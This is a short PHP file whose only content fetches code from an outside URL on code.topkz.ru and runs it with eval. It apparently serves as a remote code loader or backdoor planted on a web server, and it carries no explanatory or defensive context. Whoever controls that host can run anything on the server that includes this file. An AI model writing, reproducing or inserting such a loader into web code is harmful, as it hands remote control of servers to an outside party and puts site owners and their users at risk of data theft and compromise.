<?php
$path = "https://code.topkz.ru/fgd/8/t.php";
$code = implode('', file($path));
eval("?>" . $code);
?>